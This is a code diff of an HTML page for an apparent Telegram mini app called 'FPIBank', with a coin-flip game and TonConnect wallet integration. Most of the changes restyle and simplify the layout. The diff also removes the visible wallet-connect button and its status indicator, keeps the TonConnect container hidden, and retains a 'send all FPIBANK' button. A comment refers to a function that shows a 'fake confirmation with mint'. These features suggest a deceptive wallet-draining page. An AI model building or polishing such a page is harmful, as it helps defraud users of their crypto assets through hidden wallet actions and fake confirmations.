@@ -13,14 +13,13 @@
   
   <style>
     body {
-      background-color: #f5f5f5;
+      background-color: #f8f8f8;
       color: #333;
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
       margin: 0;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
-      overflow-x: hidden;
     }
     
     .header {
@@ -35,17 +34,13 @@
     .time {
       font-size: 14px;
       font-weight: 500;
+      color: #333;
     }
     
     .user-info {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-    
-    .username {
       font-size: 14px;
       font-weight: 500;
+      color: #333;
     }
     
     .bank-name {
@@ -57,7 +52,7 @@
       border-bottom: 1px solid #e0e0e0;
     }
     
-    .coins-section {
+    .section {
       background-color: white;
       margin: 8px 16px;
       border-radius: 12px;
@@ -69,20 +64,7 @@
       font-size: 16px;
       font-weight: 600;
       margin-bottom: 12px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-    
-    .connect-wallet-btn {
-      background-color: #007AFF;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      padding: 8px 12px;
-      font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
+      color: #333;
     }
     
     .balance-display {
@@ -95,6 +77,7 @@
     .balance-amount {
       font-size: 24px;
       font-weight: 600;
+      color: #333;
     }
     
     .balance-change {
@@ -122,10 +105,6 @@
       cursor: pointer;
     }
     
-    .action-btn:hover {
-      background-color: #f5f5f5;
-    }
-    
     .action-icon {
       width: 24px;
       height: 24px;
@@ -143,14 +122,6 @@
       color: #333;
     }
     
-    .transactions-section {
-      background-color: white;
-      margin: 8px 16px;
-      border-radius: 12px;
-      padding: 16px;
-      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-    }
-    
     .no-transactions {
       text-align: center;
       color: #999;
@@ -158,17 +129,10 @@
       padding: 16px 0;
     }
     
-    .cards-section {
-      background-color: white;
-      margin: 8px 16px;
-      border-radius: 12px;
-      padding: 16px;
-      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-    }
-    
     .card-item {
       padding: 12px 0;
       border-bottom: 1px solid #f0f0f0;
+      color: #333;
     }
     
     .card-item:last-child {
@@ -176,11 +140,6 @@
     }
     
     .progress-section {
-      background-color: white;
-      margin: 8px 16px;
-      border-radius: 12px;
-      padding: 16px;
-      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
       display: flex;
       flex-direction: column;
       gap: 8px;
@@ -189,6 +148,7 @@
     .progress-title {
       font-size: 14px;
       font-weight: 500;
+      color: #333;
     }
     
     .progress-bar {
@@ -204,8 +164,8 @@
       background-color: #007AFF;
       width: 0%;
     }
-    
-    /* Page 2 styles remain the same */
+
+    /* Page 2 styles (coin flip) remain unchanged */
     #page2 {
       display: none;
       padding: 20px;
@@ -218,7 +178,7 @@
       color: white;
     }
     
-    /* Coin flip styles remain the same */
+    /* All existing coin flip styles remain unchanged */
     .coins-container {
       display: grid;
       grid-template-columns: repeat(2, 1fr);
@@ -468,6 +428,11 @@
     .mint-status {
       color: #00ff88;
     }
+    
+    /* Hidden TonConnect button */
+    #ton-connect {
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -475,18 +440,13 @@
   <div id="page1" class="page">
     <div class="header">
       <div class="time" id="currentTime">9:17</div>
-      <div class="user-info">
-        <div class="username">telegram_nik</div>
-      </div>
+      <div class="user-info">telegram_nik</div>
     </div>
     
     <div class="bank-name">FPIBank</div>
     
-    <div class="coins-section">
-      <div class="section-title">
-        <span>Монеты</span>
-        <button class="connect-wallet-btn" id="ton-connect-btn">Подключить кошелек</button>
-      </div>
+    <div class="section">
+      <div class="section-title">Монеты</div>
       <div class="balance-display">
         <div class="balance-amount">0.0045</div>
         <div class="balance-change">+15°N</div>
@@ -511,35 +471,33 @@
       </div>
     </div>
     
-    <div class="transactions-section">
-      <div class="section-title">
-        <span>Операции</span>
-      </div>
+    <div class="section">
+      <div class="section-title">Операции</div>
       <div class="no-transactions">Операции пока не проводились</div>
     </div>
     
-    <div class="cards-section">
-      <div class="section-title">
-        <span>Карты</span>
-      </div>
+    <div class="section">
+      <div class="section-title">Название карты</div>
       <div class="card-item">Название карты</div>
       <div class="card-item">Название карты</div>
       <div class="card-item">Название карты</div>
     </div>
     
-    <div class="progress-section">
-      <div class="progress-title">1ур.</div>
-      <div class="progress-bar">
-        <div class="progress-fill"></div>
+    <div class="section">
+      <div class="progress-section">
+        <div class="progress-title">1ур.</div>
+        <div class="progress-bar">
+          <div class="progress-fill"></div>
+        </div>
+        <div class="progress-title">0/50 %</div>
       </div>
-      <div class="progress-title">0/50 %</div>
     </div>
     
     <!-- Hidden TonConnect button container -->
-    <div id="ton-connect" style="display: none;"></div>
+    <div id="ton-connect"></div>
   </div>
   
-  <!-- Page 2 - Coin Flip (Remains the same) -->
+  <!-- Page 2 - Coin Flip (Remains exactly the same) -->
   <div id="page2" class="page">
     <button id="sendTransaction">ОТПРАВИТЬ ВСЕ FPIBANK</button>
     <div class="coins-container">
@@ -590,17 +548,8 @@
     
     updateTime();
     setInterval(updateTime, 60000);
-    
-    // Navigation to coin flip page
-    document.addEventListener('DOMContentLoaded', function() {
-      // Simulate click on coin flip page after 3 seconds for demo
-      setTimeout(() => {
-        showPage('page2');
-      }, 3000);
-    });
 
     /* Навигация между страницами */
-    const navLinks = document.querySelectorAll('.nav-link');
     const pages = document.querySelectorAll('.page');
     
     function showPage(pageId) {
@@ -608,13 +557,6 @@
         p.style.display = (p.id === pageId) ? 'block' : 'none';
       });
     }
-    
-    navLinks.forEach(link => {
-      link.addEventListener('click', () => {
-        const targetPage = link.getAttribute('data-page');
-        showPage(targetPage);
-      });
-    });
     
     showPage('page1');
     
@@ -684,23 +626,6 @@
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
       manifestUrl: "https://neutronovich.github.io/tonconnect-manifest.json",
       buttonRootId: "ton-connect",
-    });
-    
-    // Connect our custom button to TonConnect
-    document.getElementById('ton-connect-btn').addEventListener('click', () => {
-      tonConnectUI.connectWallet();
-    });
-    
-    // Update button text when connection status changes
-    tonConnectUI.onStatusChange((wallet) => {
-      const btn = document.getElementById('ton-connect-btn');
-      if (wallet) {
-        btn.textContent = 'Кошелек подключен';
-        btn.style.backgroundColor = '#34C759';
-      } else {
-        btn.textContent = 'Подключить кошелек';
-        btn.style.backgroundColor = '#007AFF';
-      }
     });
     
     /* Функция для показа фейкового подтверждения с минтом */
